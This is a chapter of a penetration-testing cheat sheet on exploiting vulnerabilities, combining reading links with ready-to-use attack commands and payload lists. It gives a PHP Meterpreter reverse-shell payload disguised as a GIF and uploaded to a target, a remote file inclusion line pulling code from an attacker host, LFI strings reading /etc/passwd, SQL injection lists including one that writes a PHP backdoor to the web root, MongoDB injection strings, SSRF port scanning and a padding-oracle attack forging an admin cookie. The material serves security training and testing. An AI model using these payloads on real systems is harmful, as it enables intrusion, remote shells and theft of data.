# Chapter 3 - Exploiting Vulnerabilities

> _That was the division in the hacking world: There were people who were exploring it and the people who were trying to make money from it. And, generally, you stayed away from anyone who was trying to make money from it._
>
> _**— **_**Jeff Moss**

## Finding Exploits

##### Search Exploit-DB

```
Kali> searchsploit windows 2003 | grep -i local
```

##### Search Google

`Google> site:exploit-db.com exploit kernel <= 3`

##### Search Metasploit

```
Kali> grep -R "W7" /usr/share/metasploit-framework/modules/exploit/windows/*
```

##### Search Vulners

[Vulners Audit](https://vulners.com/audit)

## Compiling Exploits

##### Compile for Windows

```
Kali> i586-mingw32msvc-gcc exploit.c -lws2_32 -o exploit.exe
```

##### Compile for Architectures

```
Kali> gcc -m32 -o output32 hello.c (32 bit)
Kali> gcc -m64 -o output hello.c (64 bit)
```

## Breaking out of Virtualization

[Breaking into the Data Centre](https://www.youtube.com/watch?v=9ISRZJetUJw)

[VENOM Vulnerability](http://venom.crowdstrike.com)

## WebSockets

[Hacking with WebSockets HTML5](https://www.youtube.com/watch?v=bRn6ViFAomY)

## IPV6

[Penetration testing with IPv6](http://uninformed.org/?v=all&a=46&t=txt)

[How to pwn things with IPv6](https://blog.zsec.uk/ipv6-pwn/)

## HTTP

**Resources**

[OWASP AppSec Videos](https://www.owasp.org/index.php/Category:OWASP_Video)

[OWASP Testing Guide](https://www.owasp.org/images/1/19/OTGv4.pdf)

[Cracking the Lens: Attacking HTTPs hidden attack surface](https://www.youtube.com/watch?v=1Newz_wkMvs)

[How I hacked hundreds of companies through their helpdesk](https://medium.freecodecamp.org/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c)

##### Headers

> ###### Send fake IP

```
Kali> curl --header "X-Forwarded-For: 192.168.1.1" http://$TARGET
```

##### XXE

> ###### Resources

[Exploitation: XML External Entity \(XXE\) Injection](https://depthsecurity.com/blog/exploitation-xml-external-entity-xxe-injection)

[Exploiting a Real-World  XXE Vulnerability](https://www.youtube.com/watch?v=EZxGa6dqero)

[Exploiting XXE Vulnerabilities in file parsing](https://www.youtube.com/watch?v=LZUlw8hHp44)

##### XSS

> ###### Resources

[XSS Attack: Busting browsers to root](https://vimeo.com/26751019)

[DOM Clobbering](http://www.thespanner.co.uk/2013/05/16/dom-clobbering/)

[DOM Flow - Untangling the DOM](https://www.youtube.com/watch?v=kedmtrIEW1k)

##### CORS

> **Resources**

[Exploiting Misconfigured CORS](http://c0d3g33k.blogspot.in/2017/10/exploiting-misconfigured-cors.html?m=1)

##### CSRF

> ###### Resources

[Computerphile: Cross Site Request Forgery](https://www.youtube.com/watch?v=vRBihr41JTo)

[Updating Anti-CSRF Tokens with BurpSuite](https://warroom.securestate.com/updating-anti-csrf-tokens-burp-suite/)

##### SSRF

> ###### Resources

[What is Server side Request Forgery?](https://www.acunetix.com/blog/articles/server-side-request-forgery-vulnerability/)

[A New Era of SSRF](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)

[Exploiting Server Side Request Forgery on a Node/Express Application \(hosted on Amazon EC2\)](https://sethsec.blogspot.com/2015/12/exploiting-server-side-request-forgery.html)

> ###### Example

Sometimes what appears to be RFI can lead to SSRF, here are some commands to help

```
# Port scan the internal resources available
Kali> wfuzz -c -z range,1-65535 --filter "l>2" http://$TARGET/proxy.php?path=localhost:FUZZ

# If you find one, dirbust it.
Kali> wfuzz -c -w /usr/share/wordlists/dirb/big.txt --filter "l>11" http://$TARGET:8080/FUZZ
```

##### RCE

> **Resources**

[Node.js Remote Code Execution as a Service](https://www.youtube.com/watch?v=Qvtfagwlfwg)

[Exploiting Python code execution in the web](https://sethsec.blogspot.com/2016/11/exploiting-python-code-injection-in-web.html)

[Big List of Naughty Strings](https://github.com/minimaxir/big-list-of-naughty-strings)

[PHP Generic Gadget Chains](https://www.ambionics.io/blog/php-generic-gadget-chains)

[Utilizing Code Re-use or ROP in PHP Exploits](https://www.owasp.org/images/9/9e/Utilizing-Code-Reuse-Or-Return-Oriented-Programming-In-PHP-Application-Exploits.pdf)

[Pwning PHP Mail Function for fun and RCE](https://exploitbox.io/paper/Pwning-PHP-Mail-Function-For-Fun-And-RCE.html)

##### Server Side Template Injection

> **Resources**

[Server Side Template Injection](http://blog.portswigger.net/2015/08/server-side-template-injection.html)

[Server Side Template Injection: RCE for the Modern WebApp](https://portswigger.net/knowledgebase/papers/ServerSideTemplateInjection.pdf)

##### API

> **Resources**

[Cracking & Fixing REST APIs](http://www.sempf.net/post/Cracking-and-Fixing-REST-APIs)

##### LFI

> ###### Resources

[Local File Inclusion Testing Techniques](https://www.exploit-db.com/docs/40992.pdf)

[Insecure PHP Functions & their Exploits \(LFI/RFI\)](https://0xzoidberg.wordpress.com/category/security/lfi-rfi/)

[LFI and RFI -- The Website Security Vulnerability](https://www.hackersonlineclub.com/lfi-rfi/)

[Local File Inclusion to Remote Code Execution](http://resources.infosecinstitute.com/local-file-inclusion-code-execution/)

[Local File Inclusion to Remote Code Execution Advanced Exploitation PROC Shortcuts](http://www.ush.it/2008/08/18/lfi2rce-local-file-inclusion-to-remote-code-execution-advanced-exploitation-proc-shortcuts/)

> ###### Examples

```
file:///etc/passwd
../../../etc/passwd
php://filter/convert.base64-encode/resource=admin.php
php://filter/convert.base64-encode/resource=../../../../../etc/passwd
php://input
    send post data
expect://whoami
```

##### Open Redirects

> ###### Resources

[Open URL Redirects](https://zseano.com/tutorials/1.html)

##### RFI

```
Kali> echo "<?php phpinfo(); ?>" > evil.txt
http://$TARGET/index.php?path=http://$ATTACKER/evil.txt
```

##### Padding Oracle Attack

> ###### Resources

[Automated Padding Oracle Attacks with Padbuster](https://blog.gdssecurity.com/labs/2010/9/14/automated-padding-oracle-attacks-with-padbuster.html)

> ###### Arguments

```
url - first argument is the URL
encrypted - second argument is the encrypted text
bits - third argument is the number of bits per block
-cookies - define a cookie to use
-plaintext - plaintext to encrypt
```

> ###### Examples

```
Kali> padBuster.pl http://$TARGET "ENC-COOKIE-TEXT" 8
                                -cookies "ENC-COOKIE"
                                -plaintext '{"user":"admin","role":"admin"}'
```

##### AWS

> **Resources**

[AWS PENETRATION TESTING PART 1. S3 BUCKETS](https://www.virtuesecurity.com/blog/aws-penetration-testing-s3-buckets/)

##### File Upload

> ###### Make a backdoor GIF

```
# As a note, try to overwrite the magic bytes of your backdoor with a valid image
# so that the check will validate. This includes Content-Type.
Kali> msfvenom --list | grep php
Kali> msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.15.237 LPORT=54321 -o evil.php
Kali> echo “FFD8FFEo” | xxd -r -p > evil.gif
Kali> cat evil.php >> evil.gif
```

> ###### Upload From CLI

```
Kali> curl -X POST
                -F "field1=test"
                -F "file=@/home/user/evil.gif"
                http://$TARGET/upload.php
                --cookie "cookie"
```

## E-Mail

**Resources**

[How to Bypass E-Mail gateways using common payloads](https://www.youtube.com/watch?v=eZxWDCetqkE)

## iSCSI

**Resources**

[An interesting route to domain admin via ISCSI](https://www.pentestpartners.com/security-blog/an-interesting-route-to-domain-admin-iscsi/)

## Databases

##### MySQL

> ###### Resources

[SQL Injection](https://github.com/fuzzdb-project/fuzzdb/tree/master/attack/sql-injection)

[SQLMap tricks for advanced SQL injeciton](https://www.trustwave.com/Resources/SpiderLabs-Blog/Sqlmap-Tricks-for-Advanced-SQL-Injection/)

###### Examples

```
username'--
1'||'1'<'2
'OR 1=1;--
'OR 1=1;#
'OR 1=1 LIMIT 1; #
AND 1 = 2 UNION SELECT 1,2,3,4,5
1'1
1 exec sp_ (or exec xp_)
1 and 1=1
1' and 1=(select count(*) from tablenames); --
1 or 1=1
1' or '1'='1
1or1=1
1'or'1'='1
fake@ema'or'il.nl'='il.nl
1 union all select 1,2,3,4,load_file("/etc/passwd"),6
1 union all select 1,2,3,4,"<?php ?>",6 into outfile '/var/www/html/backdoor.php'
```

##### MSSQL

> ###### Resources

[PenTest & Hack MSSQL](http://travisaltman.com/pen-test-and-hack-microsoft-sql-server-mssql/)

[SQL Injection Cheatsheet MSSQL](https://www.gracefulsecurity.com/sql-injection-cheat-sheet-mssql/)

##### MongoDB

> ###### Resources

[NoSQL Map](https://github.com/codingo/NoSQLMap)

> ###### Examples

```
true, $where: '1 == 1'
, $where: '1 == 1'
$where: '1 == 1'
', $where: '1 == 1'
1, $where: '1 == 1'
{ $ne: 1 }
', $or: [ {}, { 'a':'a
' } ], $comment:'successful MongoDB injection'
db.injection.insert({success:1});
db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
|| 1==1
' && this.password.match(/.*/)//+%00
' && this.passwordzz.match(/.*/)//+%00
'%20%26%26%20this.password.match(/.*/)//+%00
'%20%26%26%20this.passwordzz.match(/.*/)//+%00
{$gt: ''}
[$ne]=1
';sleep(5000);
';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);
```

## PBX

**Resources**

[Pentesting VOIP](https://www.backtrack-linux.org/wiki/index.php/Pentesting_VOIP)

[Introduction to Telephony and PBX](http://phrack.org/issues/49/5.html#article)

##### Examples

```
Kali> svmap $TARGET
Kali> svwar -m INVITE -eSTART-END $TARGET
```



